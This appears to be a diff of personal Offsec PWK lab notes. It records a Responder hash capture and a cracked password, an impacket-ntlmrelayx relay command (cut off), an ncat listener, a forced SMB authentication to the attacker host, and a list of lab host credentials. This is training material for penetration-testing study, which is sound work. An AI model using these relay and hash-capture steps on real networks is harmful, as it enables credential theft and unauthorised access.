@@ -306,6 +306,8 @@ This provided the hash in responder
 
 ![](91-Courses/00-Offsec-PWK/assets/1633-Q2.png)
 
+![](/91-Courses/00-Offsec-PWK/assets/1633-Q2.png)
+
 Password is : sam:DISISMYPASSWORD
 
 **192.168.205.210**
@@ -347,3 +349,15 @@ Start relay on kali:  `impacket-ntlmrelayx --no-http-server -smb2support -t 192.
 Start NCAT listener on kali: `  rlwrap ncat -nvlp 8080  `
 
 sent gci \\192.168.45.207\testme   :   Success!!!
+
+---
+16.3.5 Q1 - 
+
+```
+192.168.205.248  Administrator / QWERTY123!@#   : SERVERWK248
+
+192.168.205.246  offsec / lab  CLIENTWK246
+
+192.168.205.245  offsec / lab  CLIENTWK245
+
+```
